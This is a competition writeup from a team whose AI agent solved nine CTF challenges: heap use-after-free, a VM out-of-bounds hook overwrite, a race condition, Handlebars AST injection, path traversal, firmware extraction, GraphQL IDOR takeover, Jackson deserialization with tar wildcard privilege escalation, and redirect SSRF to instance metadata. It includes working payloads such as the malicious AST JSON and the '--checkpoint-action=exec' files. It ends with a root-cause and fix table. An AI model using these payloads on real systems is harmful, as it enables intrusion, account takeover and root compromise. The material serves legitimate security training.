# UCSI Agentic AI CTF 2026 — Challenge Writeups

> Technical record of the nine-capture OtomenTiga competition portfolio.

---

## Repository Artifacts

- **Team:** OtomenTiga
- **Repository:** https://github.com/H0l3yM0l3h/OtomenTigaUCSI-AI-Agent
- **Agent architecture:** [`architecture.md`](architecture.md)
- **Replay evidence:** eight deterministic modules in [`../solvers/`](../solvers/)
- **Technology:** Python, LangGraph, LangChain, OpenAI, Anthropic, Ollama, Groq, radare2/r2pipe, pwntools, requests, aiohttp, Rich, and python-dotenv

The canonical portfolio records nine captures. Eight include deterministic replay modules; Helios Metadata Broker is retained as a documented capture and is not presented as a runnable solver.

---

## Table of Contents

1. [Grimoire Heap (PWN)](#1-grimoire-heap--pwn)
2. [Sandworm VM (PWN)](#2-sandworm-vm--pwn)
3. [Saturn Exchange (WEB)](#3-saturn-exchange--web)
4. [Pony Express 500 (WEB)](#4-pony-express-500--web)
5. [Temporary (WEB)](#5-temporary--web)
6. [OldStock Router (FIRMWARE)](#6-oldstock-router--firmware)
7. [StaffDesk (WEB)](#7-staffdesk--web)
8. [Cerberus Reports (WEB)](#8-cerberus-reports--web)
9. [Helios Metadata Broker (WEB)](#9-helios-metadata-broker--web)

---

## 1. Grimoire Heap — PWN

**Flag:** `UCSI26{grimoire_uaf_tcache_win_6e7291e6}`

### Challenge Description

A spellbook service with create, edit, delete, read, and help commands. The hint says: *"A banished spell is supposed to be gone. Is it really?"*

### Vulnerability: Use-After-Free (UAF)

The `delete` function calls `free(spells[index])` but does **not** null the pointer:

```c
// Vulnerable delete function
void delete_spell(int index) {
    free(spells[index]);
    // Missing: spells[index] = NULL;
    // Missing: sizes[index] = 0;
}
```

Since `read` and `edit` only check `if (spells[index] != NULL)`, freed chunks can still be read and written — a textbook UAF.

### Key Observations

- The flag is loaded into a heap chunk at startup: `g_flag = malloc(0x80)`
- Spell allocations also use `malloc(0x80)`, landing in the same tcache bin
- Modern glibc uses **safe-linking**: `encoded_fd = real_fd ^ (chunk_address >> 12)`

### Exploitation Steps

1. **Allocate** two spells (A, B) of size `0x80`
2. **Free A** → Read A to leak `heap_hi` (encoded_fd is 0 when tcache bin has one entry)
3. **Free B** → Read B to get encoded_fd, XOR with `heap_hi` to recover A's address
4. **Calculate** `flag_address = A_address - 0x90` (flag chunk was allocated before A)
5. **Tcache poison**: Edit freed B's fd to point to `flag_address - 0x10` (avoid metadata corruption)
6. **Allocate twice**: First malloc returns B, second returns pointer near the flag
7. **Read** the fake chunk → flag at offset 0x10

### Heap Layout

```
┌─────────────────┐
│   g_flag chunk   │  ← malloc(0x80) at startup, contains flag
│   (0x90 total)   │
├─────────────────┤
│   Spell A chunk  │  ← our first allocation
│   (0x90 total)   │
├─────────────────┤
│   Spell B chunk  │  ← our second allocation
│   (0x90 total)   │
└─────────────────┘
```

### Agent Approach

The agent:
1. Analyzed the binary to identify the UAF vulnerability
2. Recognized the glibc tcache safe-linking mechanism
3. Generated a pwntools exploit script to perform tcache poisoning
4. Executed the exploit to read the flag from the heap

---

## 2. Sandworm VM — PWN

**Flag:** `UCSI26{sandworm_vm_oob_escape_025a2ef7}`

### Challenge Description

A custom bytecode virtual machine with 16 registers, 256 memory cells, and 8-byte instructions.

### Vulnerability: Incomplete Bounds Check (OOB Access)

The VM's relative load/store opcodes validate only the base register, not the final computed index:

```c
// Vulnerable bounds check
if (r[b] > 0xff)           // Only checks base register!
    die("out of bounds");
r[a] = cells[r[b] + imm + 16];  // Final index can exceed 256
```

By setting `base = 255` (valid) and `imm = 1`, the actual index becomes `255 + 1 + 16 = 272`, which accesses the **hook function pointer** stored at VM offset `0x880`.

### VM Memory Layout

```
vm + 0x000   registers[16]        (128 bytes)
vm + 0x080   memory[256]          (2048 bytes, 8 bytes per cell)
vm + 0x880   hook function ptr    ← cell index 272 (OOB!)
vm + 0x888   hook argument
vm + 0x890   bytecode program
```

### Exploitation Steps

1. `MOV r0, 255` — Set base to max valid value
2. `RLOAD r1, [r0+1+16]` — OOB read cell 272 = `hook_default` pointer
3. `ADD r1, 0x1e0` — Add offset to reach `emit_flag` function
4. `RSTORE [r0+1+16], r1` — OOB write modified pointer back
5. `CALL hook` — Triggers `emit_flag()` instead of `hook_default()`

### Exploit Bytecode (48 bytes)

```python
prog = b"".join([
    ins(0x01, 0, imm=255),      # r0 = 255
    ins(0x14, 1, 0, imm=1),     # r1 = cells[272] (hook ptr)
    ins(0x0d, 1, imm=0x1e0),    # r1 += 0x1e0 (emit_flag offset)
    ins(0x15, 0, 1, imm=1),     # cells[272] = r1
    ins(0x16, 2),               # call hook → emit_flag()
    ins(0x00),                  # halt
])
```

### Agent Approach

The agent:
1. Identified the VM architecture and instruction encoding
2. Found the incomplete bounds check in relative memory opcodes
3. Calculated the exact offset to the hook function pointer
4. Crafted minimal bytecode (6 instructions) to redirect execution
5. Sent the payload over TCP and captured the flag

---

## 3. Saturn Exchange — WEB

**Flag:** `UCSI26{4sync_settlement_r4c3_110cbe1e}`

### Challenge Description

A Bitcoin exchange simulator starting with 1.0 BTC balance.

### Vulnerability: Race Condition (TOCTOU)

The withdrawal endpoint checks the balance before the pending withdrawals are settled. Concurrent requests all see sufficient balance because settlement happens asynchronously:

```
Time →
Request 1: check(1.0 > 0.6) ✓ → queue withdrawal
Request 2: check(1.0 > 0.6) ✓ → queue withdrawal  (settlement hasn't happened yet)
Request 3: check(1.0 > 0.6) ✓ → queue withdrawal
                                                     Settlement: 1.0 - 1.8 = -0.8 BTC
```

### Exploitation Steps

1. **Reset** the account: `POST /api/reset` → balance: 1.0 BTC
2. **Fire 3 concurrent** `POST /api/withdraw` with `{"amount": 0.6}` each
3. All three pass the balance check (1.0 > 0.6) because settlement is async
4. After settlement: `1.0 - (3 × 0.6) = -0.8 BTC`
5. **Check balance**: `POST /api/balance` → negative balance triggers flag

### Agent Approach

The agent:
1. Discovered the API endpoints by inspecting the application
2. Identified the async settlement mechanism as a race condition target
3. Used `aiohttp` to send truly concurrent HTTP requests
4. Verified the negative balance and extracted the flag

---

## 4. Pony Express 500 — WEB

**Flag:** `UCSI26{cve-2026-33937_h4ndl3b4rs_4st_1nj3ct10n}`  
**Author:** MaanVad3r

### Challenge Description

A template preview service running Node.js with Handlebars.

### Vulnerability: CVE-2026-33937 (Handlebars AST Injection)

The server passes user-supplied JSON directly to `Handlebars.compile()` without enforcing `typeof template === "string"`. Vulnerable Handlebars versions accept pre-parsed AST objects, and a forged `NumberLiteral.value` field is embedded into generated JavaScript without validation.

### Key Insight

The browser always sends `template` as a string (from a textarea), but the API accepts any JSON structure. By sending an AST object instead of a string, we bypass the Handlebars parser entirely and inject code through the `NumberLiteral.value` field.

### Fingerprinting

| Template | Result | Conclusion |
|----------|--------|------------|
| `Hello {{name}}` | `Hello rider` | Server-side rendering confirmed |
| `{{7*7}}` | HTTP 500 | Not Jinja2/Twig (no arithmetic) |
| `{{this}}` | `[object Object]` | JavaScript context = Node.js |
| `{{constructor}}` | (empty) | Prototype chain blocked |

### Exploitation Steps

1. **Confirm AST injection** — Send forged AST with `NumberLiteral.value = "{},{})) + 'AST_OK' //"` → Response: `AST_OK`

2. **Fingerprint Node.js** — Inject `process.version` → `v20.20.2`

3. **Access filesystem** — Use `process.getBuiltinModule('fs')` (available in Node 20+)

4. **Enumerate** `/flag/` directory → contains `flag.txt`

5. **Read flag** — `readFileSync('/flag/flag.txt', 'utf8')`

### Malicious AST Structure

```json
{
  "template": {
    "type": "Program",
    "body": [{
      "type": "MustacheStatement",
      "path": { "type": "PathExpression", "parts": ["lookup"] },
      "params": [
        { "type": "PathExpression", "original": "this" },
        {
          "type": "NumberLiteral",
          "value": "{},{})) + process.getBuiltinModule('fs').readFileSync('/flag/flag.txt','utf8') //",
          "original": 1
        }
      ]
    }]
  },
  "context": {}
}
```

### Agent Approach

The agent:
1. Probed the template engine to identify Handlebars
2. Recognized that string-based SSTI was blocked
3. Discovered the AST object injection vector (CVE-2026-33937)
4. Progressively escalated from harmless probe → code execution → file read
5. Navigated the filesystem to locate and extract the flag

---

## 5. Temporary — WEB

**Flag:** `UCSI26{cve-2026-44705_tmp_tr4v3rs4l_g4in_1s_f0r3v3r}`  
**Author:** MaanVad3r

### Challenge Description

A web application that generates temporary reports/notes and compiles template vault documents. The API exposes `/api/notes` (to create a note) and `/api/render?name=...` (to render template files).

### Vulnerability: Path Traversal in Note Prefix

The note creation endpoint takes a `prefix` parameter and concatenates it directly to construct the destination filename. Because the prefix input is not sanitized or checked against directory boundaries, path traversal characters (`../../`) are evaluated literally.

This allows an attacker to escape the default `/app/data/notes` folder and write arbitrary content to any directory on the server where the process has write permissions—specifically, the `/app/templates` folder.

### Exploitation Steps

1. **Create Template Note** — Send a `POST /api/notes` request with a prefix traversing to `/app/templates` and template contents to evaluate `{{FLAG}}`:
   ```json
   {
     "prefix": "../../templates/pwn",
     "content": "{{FLAG}}"
   }
   ```
   The server resolves the path, creates the file `/app/templates/pwn-1-xxxx`, and returns the note ID.

2. **Render Template** — Make a request to `/api/render?name=pwn-1-xxxx` where `name` matches the newly created template file.

3. **Leak Flag** — The server reads the note from `/app/templates/` and passes it to the template rendering compiler. Since the template compilation context holds the `FLAG` variable, evaluating `{{FLAG}}` leaks the flag in the rendered response.

### Agent Approach

The agent:
1. Probed the notes creation API and verified that path traversal was possible via the `prefix` parameter.
2. Verified that templates inside `/app/templates` were rendered by `/api/render`.
3. Created a note using traversal to plant `{{FLAG}}` in the templates folder.
4. Rendered the template to leak the flag from the context.

---

## 6. OldStock Router — FIRMWARE

**Flag:** `UCSI26{0ld5t0ck_fw_b4ckup_l34k}`

### Challenge Description

We are provided with a router firmware image `OldStock_Router_FW_v1.2.3.bin`. The objective is to identify the custom layout, extract the root filesystem, and recover a backup configuration containing the network credentials.

### Extraction Strategy

1. **Identify the File Type** — The file command registers the file as raw data, indicating a custom header.
2. **Inspect the Header** — Running hex analysis (`xxd`) shows custom text header data `OLDSFW01.2.3` up to offset `0x100` (256 bytes).
3. **SquashFS Superblock** — At offset `0x100` (256 bytes), we identify the little-endian SquashFS magic header bytes `68 73 71 73` (`hsqs`).
4. **Extraction** — Unpack the SquashFS filesystem starting at byte 256 using the offset parameter:
   ```bash
   unsquashfs -d extracted -o 256 OldStock_Router_FW_v1.2.3.bin
   ```
5. **Flag Recovery** — Read the leaked configuration backup located at `extracted/etc/config/rconfig.bak` to retrieve the flag:
   ```bash
   cat extracted/etc/config/rconfig.bak
   ```

### Agent Approach

The agent:
1. Ran hex signature inspections on the firmware file to locate the embedded SquashFS filesystem magic header.
2. Determined the filesystem start offset of `256` bytes.
3. Automatically invoked SquashFS extraction utilities targeting the offset.
4. Parsed the extracted file system, located `etc/config/rconfig.bak`, and retrieved the flag.

---

## 7. StaffDesk — WEB

**Flag:** `UCSI26{gr4phql_1d0r_2_admin_t4k30v3r}`
**Creator:** MaanVad3r

### Challenge Description

A user-directory lookup service using GraphQL. The application has registration, login, and password-reset interfaces. The challenge objective is to authenticate as the administrator (user ID `1`) and access the protected `flag` query.

### Vulnerability: GraphQL Insecure Direct Object Reference (IDOR) & Sensitive Data Exposure

The GraphQL resolver for `user(id: Int!)` verifies authentication but fails to enforce authorization checks. Any registered user can fetch the profiles of other users. 

Critically, the exposed `User` object includes the `resetToken` field, which contains the user's active password-reset credential.

### Exploitation Steps

1. **Register User** — Create a normal user account to get a valid authentication token.
2. **Retrieve Admin Reset Token** — Perform a GraphQL query to read user ID `1` (admin) and extract `User.resetToken`:
   ```graphql
   query {
     user(id: 1) {
       id
       username
       resetToken
     }
   }
   ```
3. **Admin Password Reset** — Call the `resetPassword` mutation using the admin's reset token to reset their password:
   ```graphql
   mutation {
     resetPassword(resetToken: "<ADMIN_RESET_TOKEN>", newPassword: "pwned_password_123") {
       token
     }
   }
   ```
   This mutation returns a valid administrator session token.
4. **Access Flag** — Execute the protected query `flag` using the administrator authorization token:
   ```graphql
   query {
     flag
   }
   ```

### Agent Approach

The agent:
1. Ran GraphQL introspection to map out queries, mutations, and types.
2. Identified the `User` object structure and the `resetToken` exposure.
3. Automatically registered a clean test user account.
4. Queried user ID `1` to fetch the admin's active reset token.
5. Initiated the `resetPassword` mutation immediately to avoid token renewal race conditions.
6. Used the returned admin session token to fetch the flag.

---

## 8. Cerberus Reports — WEB

**Flag:** `UCSI26{cerberus_gadget_privesc_8630453b}`
**Creator:** Lik Ken (LK)

### Challenge Description

A report importing service where analysts can upload JSON packages containing serialized reports. A SUID maintenance script is available inside the container but runs with restricted execution paths. The challenge goal is to escalate privileges and read the protected file `/srv/cerberus/admin/secret.flag`.

### Vulnerability: Jackson Polymorphic Deserialization Bypass & Tar SUID Hijack

1. **Jackson Deserialization Bypass:** The application uses a `BasicPolymorphicTypeValidator` that restricts custom deserialization classes to a specific allow-list prefix (`java.util.`). We bypass this by requesting a generic canonical collection type `java.util.ArrayList<com.ucsi.cerberus.enrich.EnrichmentTask>`. The validator verifies the allowed prefix `java.util.ArrayList`, while Jackson's generic parser instantiates elements as `EnrichmentTask`.
2. **Arbitrary Command Execution:** Deserializing `EnrichmentTask` invokes its setter `setCommand(String[])` which executes system commands as the `webapp` user.
3. **SUID Tar Wildcard Injection:** The root-owned SUID helper `/usr/local/bin/report-maint` archives reports in `/var/lib/cerberus/reports/incoming` using a wildcard `tar` command. Since the directory is world-writable, we can place files named `--checkpoint=1` and `--checkpoint-action=exec=sh pwn.sh` to hijack execution when the helper is run, executing arbitrary commands as root.

### Exploitation Steps

1. **Login** — Authenticate with hard-coded credentials `analyst:cerberus123` to obtain a session token.
2. **SUID Hijack Setup** — Write a shell script `pwn_zz.sh` inside the world-writable incoming spool folder to copy the flag to a readable location:
   ```bash
   echo 'cat /srv/cerberus/admin/secret.flag > /var/lib/cerberus/reports/incoming/flag_me.txt' > pwn_zz.sh
   chmod 666 /var/lib/cerberus/reports/incoming/flag_me.txt
   ```
3. **Wildcard Setup** — Touch the tar options file arguments inside the folder:
   ```bash
   touch "--checkpoint=1"
   touch "--checkpoint-action=exec=sh pwn_zz.sh"
   ```
4. **Trigger SUID Helper** — Execute the deserialization bypass payload targeting `/usr/local/bin/report-maint`. Tar will interpret the options files as flags and execute the script as root.
5. **Read Flag** — Output the contents of `/var/lib/cerberus/reports/incoming/flag_me.txt` to read the flag.

### Agent Approach

The agent:
1. Identified Jackson polymorphic deserialization and mapped validator exclusions.
2. Formulated the canonical generic wrapper type to bypass prefix matching.
3. Injected command execution payloads and found SUID `/usr/local/bin/report-maint`.
4. Evaluated target directory permissions and identified the wildcard tar command execution vulnerability.
5. Orchestrated the symlink/wildcard hijack chain to leak the flag via local execution.

---

## 9. Helios Metadata Broker — WEB

**Flag:** `UCSI26{helios_imds_creds_pivot_e611b736}`

### Challenge Description

Helios exposes a fetch service intended to retrieve content only through an approved edge endpoint. The goal is to reach protected internal metadata, obtain the instance-role credential, and use that identity to access the internal administration path.

### Vulnerability: Redirect-Based SSRF and Final-Destination Validation Failure

The fetch service validates the initial URL against an allow list. The approved edge endpoint can then return an unrestricted `302` redirect through its `target` parameter. Helios automatically follows that redirect but does not apply the allow-list policy again to the final destination.

This creates a time-of-check/time-of-use gap in URL policy enforcement: the URL that passes validation is not the URL that ultimately receives the server-side request.

### Exploitation Steps

1. Supply the allow-listed edge URL to the Helios `/fetch` endpoint.
2. Configure the edge redirect target as the instance metadata address at `169.254.169.254`.
3. Use the server-side redirect chain to enumerate the attached instance-role metadata.
4. Retrieve the temporary role credential from the metadata service.
5. Present that credential to the internal administration path.
6. Read the protected flag from the authorized internal response.

```text
Attacker
  → Helios /fetch
  → allow-listed edge
  → 302 redirect
  → instance metadata service
  → role credential
  → internal admin
  → flag
```

### Agent Approach

The investigation separated the URL policy decision from the actual redirect destination, tested redirect following, pivoted from the metadata endpoint to the role credential, and reused that identity against the internal service. The repository records the verified chain and flag as writeup evidence. A deterministic replay module is not included, so the CLI intentionally refuses `solver helios` instead of claiming unsupported reproducibility.

---

## Root Cause Summary

| Challenge | Root Cause | Fix |
|-----------|-----------|-----|
| Grimoire Heap | Missing pointer nullification after `free()` | Set `spells[i] = NULL` after freeing |
| Sandworm VM | Incomplete bounds check on computed memory index | Validate the *final* index, not just the base |
| Saturn Exchange | Non-atomic balance check in concurrent withdrawals | Use database transactions with row-level locks |
| Pony Express 500 | Accepting non-string input to `Handlebars.compile()` | Enforce `typeof template === "string"` |
| Temporary | Unsanitized note prefix joined to construct file path | Use filepath validation (e.g. check for traversal) |
| OldStock Router | Leaked router configuration backup in SquashFS rootfs | Remove configuration backup files from production firmware images |
| StaffDesk | Insecure direct object reference exposing `resetToken` | Enforce access checks on `user(id)` query and omit reset tokens from public profiles |
| Cerberus Reports | Insecure prefix-based polymorphic type validator & SUID wildcard tar execution | Enforce strict class validation lists and avoid running wildcard tar commands inside user-writable directories |
| Helios Metadata Broker | Initial URL is allow-listed, but the post-redirect destination is not revalidated | Disable redirects or validate every redirect hop and final resolved address; block link-local and private ranges |
